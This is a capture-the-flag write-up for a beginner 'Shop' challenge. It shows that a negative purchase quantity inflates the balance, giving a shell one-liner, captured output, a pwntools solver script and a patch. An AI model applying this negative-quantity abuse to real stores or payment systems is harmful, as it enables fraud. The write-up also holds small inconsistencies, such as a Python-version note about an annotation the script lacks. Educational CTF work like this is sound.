# LYKN CTF — "Shop" — Writeup

> **Category:** Pwn / Logic (Beginner)
> **Flag:** `LYKNCTF{wr4p_wr4p_wr4p}`
> **Author:** moriarty

A beginner-rated store challenge with two binaries (`shop` for Linux, `shop.exe`
for Windows). You start with too few coins to afford *The Flag* (priced at
`36 363 636`), and the goal is to abuse a signed-integer underflow in the
**quantity** field of the *buy* command to inflate your balance, then buy the
flag the normal way.

---

## Table of Contents
- [TL;DR](#tldr)
- [Files](#files)
- [TL;DR — one-liner repro](#tldr--one-liner-repro)
- [Binary triage](#binary-triage)
- [Reasoning / vulnerability analysis](#reasoning--vulnerability-analysis)
- [Step-by-step reproduction (interactive)](#step-by-step-reproduction-interactive)
- [Proof of Concept output](#proof-of-concept-output)
- [Automated solver — `solve_shop.py`](#automated-solver--solve_shoppy)
- [Tools used](#tools-used)
- [Patch suggestion](#patch-suggestion)
- [Flag](#flag)

---

## TL;DR

The shop computes

```
total_cost = price[item] * quantity
new_balance = balance - total_cost
```

without ever checking that `quantity > 0`. Feeding `quantity = -1` makes the
total cost negative (`36363636 * -1 = -36363636`), and subtracting a negative
number *adds* to the balance. Two buys — one with `-1` to inflate the balance,
one with `1` to actually buy the flag — prints the flag.

## Files

| Path | Description |
|------|-------------|
| `shop` | ELF 64-bit x86-64, dynamically linked, not stripped |
| `shop.exe` | PE32+ x86-64 Windows build, identical logic |
| `solve_shop.py` | Automated pwntools solver (Linux & Windows / remote-ready) |
| `poc_output.txt` | Captured stdout of the one-liner PoC |
| `writeup.txt` | Plain-text version of this writeup |
| `README.md` | This file |

## TL;DR — one-liner repro

```bash
# Linux
printf "b\n3\n-1\nb\n3\n1\nq\n" | ./shop

# Windows (cmd.exe)
( echo b& echo 3& echo -1& echo b& echo 3& echo 1& echo q ) | shop.exe
```

## Binary triage

```
shop:     ELF 64-bit LSB executable, x86-64, dynamically linked,
          interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
          not stripped
shop.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections
```

Useful strings (via `strings shop`):

```
Welcome to the Integer Overflow Shop!           <- the banner literally names the bug class
You have 100 coins. The flag is... a little out of budget.
Quantity:
Total cost: %d coin
Purchased %d x %s. New balance: %d coin
Not enough coins. Come back when you're richer.
LYKNCTF{wr4p_wr4p_wr4p}                          <- literal flag string printed on a successful purchase
print_flag / catalog / balance                  <- function-name strings (binary not stripped)
```

Runtime catalog:

```
[0] Sticker      18 coin
[1] Coffee Mug   36 coin
[2] Hoodie      1836 coin
[3] The Flag   36363636 coin  (the good stuff)
```

> Note: the banner says “100 coins” but the live game balance at the first
> `> ` prompt is actually **1836**. Either way it's far below `36 363 636`,
> so a legitimate purchase is impossible.

## Reasoning / vulnerability analysis

The *buy* action computes a **signed** total cost:

```c
total_cost  = price[item] * quantity;     // signed 32-bit multiply
new_balance = balance - total_cost;
```

Key mistakes:

1. `quantity` is read straight from stdin with **no sign or range validation**.
   A negative value is accepted.
2. The affordability check is `if (total_cost > balance) reject;`. A negative
   `total_cost` is trivially `<= balance`, so the purchase is approved.
3. Because `new_balance = balance - (negative) = balance + |cost|`, the
   balance is *inflated* by the item price instead of decreased.

Arithmetic of the PoC:

```
initial balance  =                    1 836
price(The Flag)  =               36 363 636
quantity         =                    -1
total_cost       = price * qty  =  -36 363 636     // negative!
new_balance      = 1836 - (-36_363_636)
                 =                36 365 472       // now > 36_363_636
```

The subsequent legitimate purchase of `1 × The Flag` for `36 363 636` succeeds,
and the binary prints the flag. This is the classic “store underflow via
negative quantity” pattern (same family as several real NFT-marketplace
underflow CVEs and older CTF store challenges). No memory corruption, no ROP,
no shellcode — `strings` alone is enough to confirm the entire game flow.

## Step-by-step reproduction (interactive)

| # | Action              | Input       | What the program prints                               |
|---|---------------------|-------------|-------------------------------------------------------|
| 1 | start `./shop`      | —           | catalog banner                                        |
| 2 | choose buy          | `b`         | `Item index:`                                         |
| 3 | item index          | `3`         | `Quantity:`                                           |
| 4 | quantity (TRIGGER)  | `-1`        | `Total cost: -36363636 coin`<br>`Purchased -1 x The Flag. New balance: 36365472 coin` |
| 5 | choose buy again    | `b`         | `Item index:`                                         |
| 6 | item index          | `3`         | `Quantity:`                                           |
| 7 | quantity            | `1`         | `Total cost: 36363636 coin`<br>`Purchased 1 x The Flag. New balance: 1836 coin`<br>`Here is your flag:`<br>`LYKNCTF{wr4p_wr4p_wr4p}` |
| 8 | quit                | `q`         | `Bye.`                                                |

## Proof of Concept output

Captured verbatim from `printf "b\n3\n-1\nb\n3\n1\nq\n" | ./shop` (see
`poc_output.txt`):

```
Welcome to the Integer Overflow Shop!
You have 100 coins. The flag is... a little out of budget.

=== CATALOG ===
  [0] Sticker      18 coin
  [1] Coffee Mug   36 coin
  [2] Hoodie       1836 coin
  [3] The Flag     36363636 coin  (the good stuff)
Balance: 1836 coin

[c]atalog  [b]uy  [q]uit > Item index: Quantity: Total cost: -36363636 coin
Purchased -1 x The Flag. New balance: 36365472 coin

=== CATALOG ===
  [0] Sticker      18 coin
  [1] Coffee Mug   36 coin
  [2] Hoodie       1836 coin
  [3] The Flag     36363636 coin  (the good stuff)
Balance: 36365472 coin

[c]atalog  [b]uy  [q]uit > Item index: Quantity: Total cost: 36363636 coin
Purchased 1 x The Flag. New balance: 1836 coin

Here is your flag:
LYKNCTF{wr4p_wr4p_wr4p}
```

## Automated solver — `solve_shop.py`

A small pwntools script that drives the binary the same way. The script is
**path-aware** (auto-detects `shop` next to itself, then in `cwd`) and accepts
an explicit path as its first CLI argument — so it works against the Linux
binary, the Windows binary (`shop.exe` under Wine or native), or any remote
TCP service after swapping the single `process(...)` line for
`remote(host, port)`.

### Run

```bash
# default — auto-detect ./shop in cwd or next to the script
python3 solve_shop.py

# explicit binary path
python3 solve_shop.py /path/to/shop
python3 solve_shop.py shop.exe      # windows binary (under wine / native windows)
```

### Expected output

```
[+] FLAG => LYKNCTF{wr4p_wr4p_wr4p}
```

### Full source (also see `solve_shop.py`)

```python
#!/usr/bin/env python3
# solve_shop.py
# Author: moriarty
# Solves the "Shop" challenge from LYKN CTF by exploiting the
# negative-quantity signed-integer underflow in the buy command.
#
# Vulnerability summary
# ---------------------
#   The shop computes a SIGNED 32-bit total cost:
#       total_cost = price[item] * quantity
#       new_balance = balance - total_cost
#   `quantity` is read from stdin without any sign/range check, so a negative
#   value produces a negative total cost, which (when subtracted from the
#   balance) actually INCREASES the balance. The affordability check passes
#   because a negative cost is trivially "affordable".
#
#   Two-step exploit:
#     1. Buy quantity -1 of The Flag (item 3, price 36_363_636):
#            new_balance = 1836 - (36363636 * -1) = 36_365_472
#     2. Buy quantity 1 of The Flag for real — now affordable.
#     3. The binary prints the flag on a successful flag purchase.
#
# Usage
# -----
#   cd <dir containing `shop` binary>
#   python3 solve_shop.py
#
# Swap "shop" for "shop.exe" on Windows; the rest of the script is unchanged.
# It also works directly against a remote TCP service if you replace the
# `process(...)` line with `remote(host, port)`.

import os
import sys
from pwn import process, context, log

context.log_level = "warn"   # quiet pwntools; set to "info" for full debug

# Default: look for `shop` next to this script, then in the current working dir.
# Override by passing the path as the first CLI argument:
#     python3 solve_shop.py /path/to/shop
HERE = os.path.dirname(os.path.abspath(__file__)) or "."
BINARY = sys.argv[1] if len(sys.argv) > 1 else os.path.join(HERE, "shop")
if not os.path.exists(BINARY):
    BINARY = "./shop"          # fallback for cwd-based runs / Windows shop.exe
FLAG_ITEM = 3
WRAP_QTY = -1                 # negative quantity -> negative total_cost
BUY_QTY = 1                   # the real purchase once balance is inflated


def buy(p, idx: int, qty: int) -> str:
    """Issue a `b` command and return the textual response block."""
    p.sendline(b"b")
    p.recvuntil(b"Item index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Quantity: ")
    p.sendline(str(qty).encode())
    return p.recvuntil(b">", drop=True).decode(errors="replace")


def grab_flag(*blocks: str) -> str:
    """Find the first LYKNCTF{...} substring in any of the given text blocks."""
    import re
    for block in blocks:
        m = re.search(r"LYKNCTF\{[^}]+\}", block)
        if m:
            return m.group(0)
    return ""


def main() -> None:
    p = process(BINARY)
    p.recvuntil(b">", )      # skip the initial catalog dump + first menu prompt

    blocks = []

    # Step 1 — inflate the balance via the underflow.
    blocks.append(buy(p, FLAG_ITEM, WRAP_QTY))
    log.info("after wraparound: %s", blocks[-1].strip().splitlines()[0])

    # Step 2 — buy the flag for real. The flag is printed inside this block.
    blocks.append(buy(p, FLAG_ITEM, BUY_QTY))
    log.info("after purchase:  %s", blocks[-1].strip().splitlines()[0])

    # Step 3 — quit and also harvest trailing stdout, just in case.
    p.sendline(b"q")
    p.recvall(timeout=2)
    p.close()

    flag = grab_flag(*blocks)
    if flag:
        # Use print() so the flag is always visible regardless of log_level.
        print(f"[+] FLAG => {flag}")
    else:
        print("[-] flag not found in captured output:")
        for i, b in enumerate(blocks):
            print(f"    block {i}:\n{b}")


if __name__ == "__main__":
    main()
```

> Requires Python ≥ 3.10 (for the `str | None`/`str` union hint syntax). If
> you're on an older Python, replace `str | None` with `Optional[str]` from
> `typing` — or just delete the annotation; behaviour is unchanged.

## Tools used

- **`file`** — identify binary format / arch
- **`strings`** — pull the literal flag, the catalog printf strings, and the
  function-name strings out of the binary (proves it is not stripped and
  reveals the entire game flow)
- **`bash` / `printf`** — driving stdin of the binary for the one-liner PoC
- **`pwntools`** — I/O for the documented Python solver
- No reverse-engineering toolchain (Ghidra / IDA) was required: the binary is
  not stripped and `strings` already reveals every relevant code path; the
  "Integer Overflow Shop" banner also literally names the bug class.

## Patch suggestion

Validate the quantity before computing cost:

```c
if (quantity <= 0) {
    puts("bad input");
    continue;
}
```

Or, more defensively, use unsigned integers for currency and quantity and a
checked-multiply helper that aborts on overflow. Anything that prevents a
negative `total_cost` from being accepted fixes the issue.

## Flag

```
LYKNCTF{wr4p_wr4p_wr4p}
```